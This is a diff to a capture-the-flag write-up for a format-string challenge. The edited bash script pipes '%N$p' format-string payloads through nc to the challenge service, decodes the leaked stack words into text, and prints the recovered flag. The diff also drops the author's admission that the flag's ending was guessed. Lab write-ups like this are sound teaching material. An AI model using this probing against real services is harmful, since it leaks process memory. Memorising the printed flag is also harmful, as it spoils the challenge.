@@ -57,25 +57,26 @@ If you're new to format-string exploits read this: [Exploiting Format String Vul
 ```bash
 #!/bin/bash
 
-for((p=8;p<14;p++)) {
+for((p=8;p<12;p++)) {
     echo '%'$p'$p' | \
     nc dctf-chall-readme.westeurope.azurecontainer.io 7481 | \
     grep 'hello ' | \
     awk -Fx '{print $NF}' | \
+    sed 's/.*00//' | \
     xxd -r -p | \
     rev
 }
+echo '}'
 ```
 
 This `bash` script will `echo %8$p`, then `echo %9$p`, etc... into the challenge service serially (one by one), capturing the output (`grep`, `awk`), converting to text (`xxd`), and then finally reversing the string (`rev`, since x86_64 is little endian).
+
+> `sed` is used to detect end of string.
 
 Output:
 
 ```bash
 # ./exploit.sh
-dctf{n0w_g0_r3ad_s0me_b0
-rev: stdin: Invalid or incomplete multibyte or wide character
-rev: stdin: Invalid or incomplete multibyte or wide character
+dctf{n0w_g0_r3ad_s0me_b00k5}
 ```
 
-Yeah, so the input string corrupting stack?  Didn't really look that hard into the problem, just guessed the `0k5` at the end. 
